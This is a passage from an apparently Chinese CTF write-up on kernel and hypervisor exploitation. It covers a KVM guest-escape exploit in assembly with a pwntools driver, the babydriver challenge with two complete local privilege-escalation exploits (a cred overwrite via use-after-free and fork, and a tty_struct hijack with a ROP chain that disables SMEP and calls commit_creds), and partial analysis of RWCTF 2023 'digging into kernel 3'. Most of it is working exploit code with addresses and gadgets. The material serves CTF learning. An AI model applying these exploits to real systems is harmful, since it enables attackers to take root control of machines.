    dw 0x0 ; Base (bits 0-15)
    db 0x0 ; Base (bits 16-23)
    db 10011010b ; Access Byte
    db 11001111b ; Flags , Limit (bits 16-19)
    db 0x0 ; Base (bits 24-31)
; 数据段描述符
gdt_data:
    dw 0xffff ; Limit (bits 0-15)
    dw 0x0 ; Base (bits 0-15)
    db 0x0 ; Base (bits 16-23)
    db 10010010b ; Access Byte
    db 11001111b ; Flags , Limit (bits 16-19)
    db 0x0 ; Base (bits 24-31)
; 栈段描述符
gdt_stack:
    dw 0x7c00 ; Limit (bits 0-15)
    dw 0x0 ; Base (bits 0-15)
    db 0x0 ; Base (bits 16-23)
    db 10010010b ; Access Byte
    db 01000000b ; Flags , Limit (bits 16-19)
    db 0x0 ; Base (bits 24-31)
gdt_end:
 
; GDT descriptior
gdt_descriptor:
dw gdt_end - gdt_start - 1 ; Size of our GDT, always less one of the true size
dd gdt_start ; Start address of our GDT
```

解除了寻址为1M的限制，也就不用再爆破地址了,也能直接赋值给0x1f5bb58这样的地址了

exp.asm
```c
org 0 
cli                     ; 屏蔽中断
 
lgdt [gdt_descriptor]   ; 初始化GDT
 
; 把 cr0 的最低位置为 1，开启保护模式
mov eax, cr0
or eax, 0x1
mov cr0, eax
jmp 08h:PModeMain
times 40 db 0x00
; .endr

[bits 32]
PModeMain:
    mov ax, 0x10        ; 将数据段寄存器ds和附加段寄存器es置为0x10
    mov ds, ax         
    mov es, ax
    mov fs, ax          ; fs和gs寄存器由操作系统使用，这里统一设成0x10
    mov gs, ax
    mov ax, 0x18        ; 将栈段寄存器ss置为0x18
    mov ss, ax
    mov ebp, 0x7c00     ; 现在栈顶指向 0x7c00
    mov esp, ebp

    mov ebx, [0x7100]
    add ebx, 0x1b48
    sub ebx, 0x603000
    mov edx, [ebx]		
    sub edx, 0x3c51a8	
    add edx, 0x4527a	; gadget addr
        
    mov  [0x7200], edx
        
    mov ebx, [0x7100]
    add ebx, 0x27e0		; target &nbytes addr
    add ebx, 0x8
    sub ebx, 0x603000	; memcpy arg1 -> &nbytes

    ; pop edx
    mov  edx, [0x7200]
    mov [ebx], edx      ; gadget to &nbytes

    mov ecx, 0x602020
    mov [0x7100],ecx        ; memcpy arg0 -> 0x602020
    hlt


gdt_start:
; 第一个描述符必须是空描述符
gdt_null:
    dd 0
    dd 0
; 代码段描述符
gdt_code:
    dw 0xffff ; Limit (bits 0-15)
    dw 0x0 ; Base (bits 0-15)
    db 0x0 ; Base (bits 16-23)
    db 10011010b ; Access Byte
    db 11001111b ; Flags , Limit (bits 16-19)
    db 0x0 ; Base (bits 24-31)
; 数据段描述符
gdt_data:
    dw 0xffff ; Limit (bits 0-15)
    dw 0x0 ; Base (bits 0-15)
    db 0x0 ; Base (bits 16-23)
    db 10010010b ; Access Byte
    db 11001111b ; Flags , Limit (bits 16-19)
    db 0x0 ; Base (bits 24-31)
; 栈段描述符
gdt_stack:
    dw 0x7c00 ; Limit (bits 0-15)
    dw 0x0 ; Base (bits 0-15)
    db 0x0 ; Base (bits 16-23)
    db 10010010b ; Access Byte
    db 01000000b ; Flags , Limit (bits 16-19)
    db 0x0 ; Base (bits 24-31)
gdt_end:
 
; GDT descriptior
gdt_descriptor:
dw gdt_end - gdt_start - 1 ; Size of our GDT, always less one of the true size
dd gdt_start ; Start address of our GDT
```

exp.py
```python
# _*_ coding:utf-8 _*_
from pwn import *
import re
import os, struct, random, time, sys, signal
import hashlib
from hashlib import sha256

p = remote("127.0.0.1","8000") #typ="udp"
# p = process("./pwn")
elf = ELF("./mykvm")
libc = elf.libc

context.log_level = "debug" # info
context.arch = elf.arch
context.terminal = ['tmux', 'splitw', '-hp','64']


def dbg(breakpoint=''):
    elf_base = int(os.popen('pmap {}| awk \x27{{print \x241}}\x27'.format(p.pid)).readlines()[1], 16) if elf.pie else 0
    script = 'b *{:#x}\n'.format(int(breakpoint) + elf_base) if isinstance(breakpoint, int) else breakpoint
    gdb.attach(p,script)
    pause()

#-----------------------------------------------------------------------------------------
s       = lambda data               :p.send(str(data))
sa      = lambda text,data          :p.sendafter(text, str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda text,data          :p.sendlineafter(text, str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda text               :p.recvuntil(text)
ia      = lambda                    :p.interactive()
hs256   = lambda data               :sha256(str(data).encode()).hexdigest()
l32     = lambda                    :u32(p.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
l64     = lambda                    :u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
uu32    = lambda                    :u32(p.recv(4).ljust(4,'\x00'))
uu64    = lambda                    :u64(p.recv(6).ljust(8,'\x00'))
int16   = lambda data               :int(data,16)
lg      = lambda s                  :p.success('%s -> 0x%x' % (s, eval(s)))
# sc      = lambda                    :shellcraft.amd64.linux.sh()
#-----------------------------------------------------------------------------------------


with open("./exp.bin", "rb") as f:
    shellcode = f.read()

# pause()
sla("your code size: ",len(shellcode))
sa("your code:",shellcode)
sla("guest name:",'aaaa')
sla("guest passwd:",'bbbb')
sla("host name: ",'cccc')


ia()
```


### babydriver

一道内核的入门题目，首先检查信息
```shell
qemu-system-x86_64 -initrd rootfs.cpio -kernel bzImage -append 'console=ttyS0 root=/dev/ram oops=panic panic=1'  -monitor /dev/null -m 64M --nographic  -smp cores=1,threads=1 -cpu kvm64,+smep -enable-kvm
```

开启了smep，没有开启kaslr

提取文件系系统，关注其启动文件 init

```shell
excpio rootfs.cpio
```

```shell
➜  rootfs cat init
#!/bin/sh

mount -t proc none /proc
mount -t sysfs none /sys
mount -t devtmpfs devtmpfs /dev
chown root:root flag
chmod 400 flag
exec 0</dev/console
exec 1>/dev/console
exec 2>/dev/console

insmod /lib/modules/4.4.72/babydriver.ko
chmod 777 /dev/babydev
echo -e "\nBoot took $(cut -d' ' -f1 /proc/uptime) seconds\n"
setsid cttyhack setuidgid 1000 sh

umount /proc
umount /sys
poweroff -d 0  -f
```

加载了一个内核模块babydriver.ko(关于内核模块的编写这里可以专门学习一下)，内核版本4.4.72

也可以启动以后再查看，同时由于没有开启kalsr，我们提取一下函数符号表

```
/ $ lsmod
babydriver 16384 0 - Live 0xffffffffc0000000 (OE)

cat /proc/kallsyms > /tmp/kallsyms.txt
cat /tmp/kallsyms.txt | grep "prepare_kernel_cred"
cat /tmp/kallsyms.txt | grep "commit_creds"

ffffffff810a1810 T prepare_kernel_cred
ffffffff81d91890 R __ksymtab_prepare_kernel_cred
ffffffff81dac968 r __kcrctab_prepare_kernel_cred
ffffffff81db9450 r __kstrtab_prepare_kernel_cred

ffffffff810a1420 T commit_creds
ffffffff81d88f60 R __ksymtab_commit_creds
ffffffff81da84d0 r __kcrctab_commit_creds
ffffffff81db948c r __kstrtab_commit_creds
```

然后就是分析babydriver.ko这个模块了

```c
int __cdecl babydriver_init()
{
  int v0; // edx
  int v1; // ebx
  class *v2; // rax
  __int64 v3; // rax

  if ( alloc_chrdev_region(&babydev_no, 0LL, 1LL, "babydev") >= 0 )//为设备分配一个主设备号和一个次设备号,babydev_no 将存储分配的设备号
  {
    cdev_init(&cdev_0, &fops);//初始化字符设备并将其与文件操作结构体 fops 关联
    cdev_0.owner = &_this_module;
    v1 = cdev_add(&cdev_0, babydev_no, 1LL);//将设备加入系统
    if ( v1 >= 0 )
    {
      v2 = _class_create(&_this_module, "babydev", &babydev_no);//创建一个新的设备类，这个类在 /sys/class 下对应一个目录，/sys/class/babydev
      babydev_class = v2;
      if ( v2 )
      {
        v3 = device_create(v2, 0LL, babydev_no, 0LL, "babydev");//！！！创建了一个设备节点，通常在 /dev 目录下。这使得用户空间的程序可以通过设备文件与驱动程序进行交互。
        v0 = 0;
        if ( v3 )
          return v0;
        printk(&unk_351);
        class_destroy(babydev_class);
      }
      else
      {
        printk(&unk_33B);
      }
      cdev_del(&cdev_0);
    }
    else
    {
      printk(&unk_327);
    }
    unregister_chrdev_region(babydev_no, 1LL);
    return v1;
  }
  printk(&unk_309);
  return 1;
}
```

![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/20240102110359.png)

这里谈一下file_operations，这个结构体会把是个函数功能指针会把常见的函数和模块的函数做一个对应
```c
00000000 file_operations struc ; (sizeof=0xD8, align=0x8, copyof_137)
00000000                                         ; XREF: .data:fops/r
00000000 owner dq ?                              ; offset
00000008 llseek dq ?                             ; offset
00000010 read dq ?                               ; offset
00000018 write dq ?                              ; offset
00000020 read_iter dq ?                          ; offset
00000028 write_iter dq ?                         ; offset
00000030 iterate dq ?                            ; offset
00000038 poll dq ?                               ; offset
00000040 unlocked_ioctl dq ?                     ; offset
00000048 compat_ioctl dq ?                       ; offset
00000050 mmap dq ?                               ; offset
00000058 open dq ?                               ; offset
00000060 flush dq ?                              ; offset
00000068 release dq ?                            ; offset
00000070 fsync dq ?                              ; offset
00000078 aio_fsync dq ?                          ; offset
00000080 fasync dq ?                             ; offset
00000088 lock dq ?                               ; offset
00000090 sendpage dq ?                           ; offset
00000098 get_unmapped_area dq ?                  ; offset
000000A0 check_flags dq ?                        ; offset
000000A8 flock dq ?                              ; offset
000000B0 splice_write dq ?                       ; offset
000000B8 splice_read dq ?                        ; offset
000000C0 setlease dq ?                           ; offset
000000C8 fallocate dq ?                          ; offset
000000D0 show_fdinfo dq ?                        ; offset
000000D8 file_operations ends
```

事实上release函数是当用户空间程序执行 close() 系统调用时调用的函数

通过/dev/babydev就能用通用函数和模块函数进行交互了，结合fops主要定义了几个函数功能

```c
int __fastcall babyrelease(inode *inode, file *filp)
{
  _fentry__(inode, filp);
  kfree(babydev_struct.device_buf);// UAF
  printk("device release\n");
  return 0;
}

int __fastcall babyopen(inode *inode, file *filp)
{
  _fentry__(inode, filp);
  babydev_struct.device_buf = kmem_cache_alloc_trace(kmalloc_caches[6], 0x24000C0LL, 0x40LL);//在内核内存中分配内存给全局变量babydev_struct.device_buf，(类型，标志，大小)，kmalloc_caches[6]特定大小的 kmem_cache
  babydev_struct.device_buf_len = 64LL;
  printk("device open\n");
  return 0;
}

__int64 __fastcall babyioctl(file *filp, unsigned int command, unsigned __int64 arg)
{
  size_t v3; // rdx
  size_t v4; // rbx

  _fentry__(filp, command);
  v4 = v3;
  if ( command == 0x10001 )
  {
    kfree(babydev_struct.device_buf);
    babydev_struct.device_buf = _kmalloc(v4, 0x24000C0LL);//重新分配一个指定大小的堆块
    babydev_struct.device_buf_len = v4;
    printk("alloc done\n");
    return 0LL;
  }
  else
  {
    printk(&unk_2EB);
    return -22LL;
  }
}


ssize_t __fastcall babywrite(file *filp, const char *buffer, size_t length, loff_t *offset)
{
  size_t v4; // rdx
  ssize_t result; // rax
  ssize_t v6; // rbx

  _fentry__(filp, buffer);
  if ( !babydev_struct.device_buf )
    return -1LL;
  result = -2LL;
  if ( babydev_struct.device_buf_len > v4 )
  {
    v6 = v4;
    copy_from_user();//将用户态的数据(也就是我们输入的)拷贝给babydev_struct.device_buf
    return v6;
  }
  return result;
}

ssize_t __fastcall babyread(file *filp, char *buffer, size_t length, loff_t *offset)
{
  size_t v4; // rdx
  ssize_t result; // rax
  ssize_t v6; // rbx

  _fentry__(filp, buffer);
  if ( !babydev_struct.device_buf )
    return -1LL;
  result = -2LL;
  if ( babydev_struct.device_buf_len > v4 )
  {
    v6 = v4;
    copy_to_user(buffer);//babydev_struct.device_buf指向的内容拷贝到用户态
    return v6;
  }
  return result;
}

```

babyopen中存在漏洞，简单来说这个功能是用于分配堆块的，这里把分配的指针放到了内核模块的bss段上，就导致了每个新open的该设备的fd所开辟的堆块，被所有使用该设备的fd共用。这是一个逻辑问题，在babyioctl同样存在

babyrelease的UAF漏洞

所以第一种思路就是UAF
fork子进程时，会分配0xa8大小(size)的内核堆，主要用于存储当前进程的一些信息，包括权限等。babyioctl可以分配一个0xa8大小的堆块然后free掉，再执行fork，再结合babyopen的多个fd指针，就可修改fork进程结构体里的内容
对于改子进程cred的方法也有2种思路，核心是子进程要先于父进程执行system("/bin/sh")
+ 可以在父进程设置一个wait(NULL)操作都在子进程中完成
+ 可以在子进程设置一个sleep，且只执行system("/bin/sh")，父进程完成所有操作

EXP

```c
#include<stdlib.h>

int main(){
	int fd1 = open("/dev/babydev",2);
	int fd2 = open("/dev/babydev",2);	

	ioctl(fd1,0x10001,0xa8);
	close(fd1);
	pid_t fpid; 
	fpid=fork();
	if (fpid < 0) 
	{
		printf("error in fork!\n"); 
		exit(0);
	}
	else if (fpid == 0) 
	{
		printf("child pid is : %d\n",getpid());
		char zeros[30] = {0};
		write(fd2,zeros,28);
		system("/bin/sh");
		exit(0);
	}
	// {
	// 	printf("child pid is : %d\n",getpid());
	// 	sleep(3)
	// 	system("/bin/sh");
	// 	exit(0);
	// }
	else 
	{
		wait(NULL);
		printf("parent pid is: %d\n",getpid());
	}
	// {
	// 	char zeros[30] = {0};
	// 	write(fd2,zeros,28);
	// 	wait(NULL);
	// 	printf("parent pid is: %d\n",getpid());
	// }
	printf("%d: going to close fd2\n",getpid());
	close(fd2);
	return 0;
}
```


还有一种可以利用的就是tty_struct结构体
这个结构体是在开启/dev/ptmx设备节点时，会被分配到一个0x2e0（不同内核版本有所区别）的结构体tty_struct
这个结构体如下
```c
struct tty_struct {
	int	magic; //4
	struct kref kref;//4
	struct device *dev;//8
	struct tty_driver *driver;//8
	const struct tty_operations *ops; 
  // ······
}
// https://elixir.bootlin.com/linux/v4.7.2/source/include/linux/tty.h#L272
```

```c
struct tty_operations {
	struct tty_struct * (*lookup)(struct tty_driver *driver,
			struct file *filp, int idx);
	int  (*install)(struct tty_driver *driver, struct tty_struct *tty);
	void (*remove)(struct tty_driver *driver, struct tty_struct *tty);
	int  (*open)(struct tty_struct * tty, struct file * filp);
	void (*close)(struct tty_struct * tty, struct file * filp);
	void (*shutdown)(struct tty_struct *tty);
	void (*cleanup)(struct tty_struct *tty);
	int  (*write)(struct tty_struct * tty,
		      const unsigned char *buf, int count);
	int  (*put_char)(struct tty_struct *tty, unsigned char ch);
	void (*flush_chars)(struct tty_struct *tty);
	int  (*write_room)(struct tty_struct *tty);
	int  (*chars_in_buffer)(struct tty_struct *tty);
	int  (*ioctl)(struct tty_struct *tty,
		    unsigned int cmd, unsigned long arg);
  // ......
}
```

这个结构体里存放的是对应终端的一些操作函数,这些函数包括但不限于：

open：打开一个 TTY 设备。
close：关闭一个 TTY 设备。
write：向 TTY 设备写入数据。
read：从 TTY 设备读取数据。
ioctl：执行控制操作，如改变终端设置。
set_termios：设置终端的属性。

可以去劫持这个结构体里的函数指针实现利用

由于要在内核态执行ROP，所以需要保存用户态上下文和考虑用户态着陆，这部分都是板子内容就不再赘述
这里的思路是，利用UAF漏洞劫持tty_struct结构体，利用read函数将结构体的数据提取出来便于伪造，修改tty_operations指针为我们在用户态设置的伪造tty_operations的地址，然后伪造tty_operations，这里主要劫持write函数，通过调试得到在执行该write函数时，rax为用户态伪造tty_operations的地址，所以将整个tty_operations结构体覆盖为mov rsp rax，这样就能控制执行流到tty_operations结构体开始的位置，然后在tty_operations结构体的前边放置好栈迁移指令，迁移到用户态上构造的ROP链，就完成了利用。
这里开启了smep，要在ROP的时候修改cr4寄存器来关闭smep，常将cr4的值设置为0x6f0

EXP
将-enable-kvm参数删除
```c
//gcc -Wall -static -o exp exp2.c
#include<unistd.h>
#include<stdio.h>
#include<stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>

size_t pkc_addr = 0xffffffff810a1810;
size_t cc_addr = 0xffffffff810a1420;
void get_root(){
    char* (*pkc)(int) = pkc_addr;
    void (*cc)(char*) = cc_addr;
    (*cc)((*pkc)(0));
}

void get_shell(){
    system("/bin/sh");
}

size_t user_cs, user_rflags, user_sp, user_ss;
void save_status()
{
    __asm__("mov %cs, user_cs;"
            "mov %ss, user_ss;"
            "mov %rsp, user_sp;"
            "pushf;"
            "pop user_rflags;"
            );
    puts("[*]status has been saved.");
}

int main(){
    save_status();

    size_t mov_rsp_rax = 0xffffffff8181bfc5;    // mov rsp, rax ; dec ebx ; jmp 0xffffffff8181bf7e
    size_t pop_rax = 0xffffffff8100ce6e;        // pop rax; ret; 
    size_t rop_chain[30] = {0};
    int index = 0;
    rop_chain[index++] = 0xffffffff810d238d;        // pop rdi; ret;
    rop_chain[index++] = 0x6f0;
    rop_chain[index++] = 0xffffffff81004d80;        // mov cr4, rdi; pop rbp; ret; 
    rop_chain[index++] = 0x0;
    rop_chain[index++] = (size_t)get_root;
    rop_chain[index++] = 0xffffffff81063694;        // swapgs; pop rbp; ret; 
    rop_chain[index++] = 0x0;
    rop_chain[index++] = 0xffffffff814e35ef;        // iretq; ret;
    rop_chain[index++] = (size_t)get_shell;
    rop_chain[index++] = user_cs;
    rop_chain[index++] = user_rflags;
    rop_chain[index++] = user_sp;
    rop_chain[index++] = user_ss;

    size_t tty_operations_fake[30];
    for(int j=0;j<30;j++){
        tty_operations_fake[j]=mov_rsp_rax;   
    }

    int fd1 = open("/dev/babydev",2);
    int fd2 = open("/dev/babydev",2);

    ioctl(fd1,0x10001,0x2e0);
    close(fd1);

    int fd_tty = open("dev/ptmx",2);

    size_t tty_struct_leak[4];
    read(fd2,tty_struct_leak,32);
    
    tty_operations_fake[0] = pop_rax;
    tty_operations_fake[1] = (size_t)rop_chain;
    tty_operations_fake[2] = mov_rsp_rax;

    tty_struct_leak[3] = (size_t)tty_operations_fake;
    write(fd2,tty_struct_leak,32);

    size_t a[4] = {0,0,0,0};
    write(fd_tty,a,32);
    // ioctl(fd_tty,0x100,32);

    close(fd2);
	return 0;
}
```



### 2023RWCTF digging into kernel 3

先检查信息
```shell
#!/bin/sh
qemu-system-x86_64 \
        -m 128M \
        -nographic \
        -kernel ./bzImage \
        -initrd ./rootfs.img \
        -enable-kvm \
        -cpu kvm64,+smap,+smep \
        -monitor /dev/null \
        -append 'console=ttyS0 kpti=1 quiet kaslr oops=panic panic=1 init=/init' \
        -no-reboot \
        -snapshot 
```

题目开了kaslr,smep（要用ptregs），再看下init

```shell
#!/bin/sh

mkdir /tmp
mount -t proc none /proc
mount -t sysfs none /sys
mount -t devtmpfs none /dev
mount -t tmpfs none /tmp

exec 0</dev/console
exec 1>/dev/console
exec 2>/dev/console

insmod /rwctf.ko
chmod 666 /dev/rwctf
chmod 700 /flag
chmod 400 /proc/kallsyms

echo 1 > /proc/sys/kernel/kptr_restrict
echo 1 > /proc/sys/kernel/dmesg_restrict

# poweroff -d 120 -f &

echo -e "Boot took $(cut -d' ' -f1 /proc/uptime) seconds"
setsid /bin/cttyhack setuidgid 0 /bin/sh

umount /proc
umount /sys
umount /tmp

poweroff -d 0 -f
```

把超时挂起和权限改了，把run.sh里的kaslr改为nokaslr，方便调试

由于限制了/proc/kallsyms的权限，我们是看不了函数表的/proc/kallsyms，这里着重分析rwctf.ko
基本上只有一个功能rwmod_ioctl
```c
__int64 __fastcall rwmod_ioctl(__int64 a1, int a2, __int64 a3)
{
  __int64 v3; // r12
  __int64 v5; // rbx
  __int64 v6; // rdi
  unsigned int idx; // [rsp+0h] [rbp-30h] BYREF
  unsigned int size; // [rsp+4h] [rbp-2Ch]
  __int64 con; // [rsp+8h] [rbp-28h]
  unsigned __int64 v10; // [rsp+18h] [rbp-18h]

  v10 = __readgsqword(0x28u);
  if ( !a3 )
    return -1LL;
  if ( a2 == 0xC0DECAFE )
  {
    if ( !copy_from_user(&idx, a3, 0x10LL) && idx <= 1 )
      kfree(buf[idx]);
    return 0LL;
  }
  v3 = -1LL;
  if ( a2 == 0xDEADBEEF )
  {
    if ( copy_from_user(&idx, a3, 0x10LL) )
      return 0LL;
    v5 = idx;
    if ( idx > 1 )
      return 0LL;
    buf[v5] = _kmalloc(size, 0xDC0LL);
    v6 = buf[idx];
    if ( !v6 )
      return 0LL;
    if ( size > 0x7FFFFFFFuLL )
      BUG();
    if ( copy_from_user(v6, con, size) )
      return 0LL;
  }
  return v3;
}
```

根据a2不同执行不同的分支
关于copy_from_user

```c
unsigned long copy_from_user(void *to, const void __user *from, unsigned long n);

两个参数都是指针，返回未成功复制的字节数
```


当a2为0xC0DECAFE，把a3里边的值拷贝到idx，idx只能取0和1，然后一个UAF
当a2为0xDEADBEEF，就是开一个size的堆块放到buf里，idx只能取0和1，size不能过大，再把内容拷贝过去，结合栈结构，先先写一个结构体
![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/20240105172824.png)

```c
struct rwstruct{
	unsigned int idx;//4
	unsigned int size;//4
	char *con;//8
}
```

2个功能菜单

```c
int g_fd;

int rwctf_ioctl_kmalloc(int idx,int size, char* con){
	struct rwstruct rw_buf;
	rw_buf.idx = idx;
	rw_buf.size = size;
	rw_buf.con = con;
	ioctl(g_fd,0xDEADBEEF,&rw_buf);
}


int rwctf_ioctl_kfree(int idx){
	struct rwstruct rw_buf;
	rw_buf.idx = idx;
	rw_buf.size = 0;
	rw_buf.con = 0;
	ioctl(g_fd,0xC0DECAFE,&rw_buf);
}
```

有了任意size创建和UAF，接下来就可以开始利用了

方法一
首先考虑没有kalsr下如何完成利用
后续肯定是要ptregs实现ROP的，有了任意堆大小的UAF可以劫持seq_operations，控制rip后就add_rsp执行ptregs，然后就可以考虑modprobe_path

难点在于leak偏移，这里用的是劫持user_key_payload的方法，利用UAF劫持user_key_payload结构体，泄露内核堆上的内容，再结合key_revoke+add_key堆喷，就能泄露user_free_payload_rcu地址从而拿到kernelbase










https://bbs.kanxue.com/thread-279787.htm

https://arttnba3.cn/2022/03/08/CTF-0X06-D3CTF2022_D3KHEAP/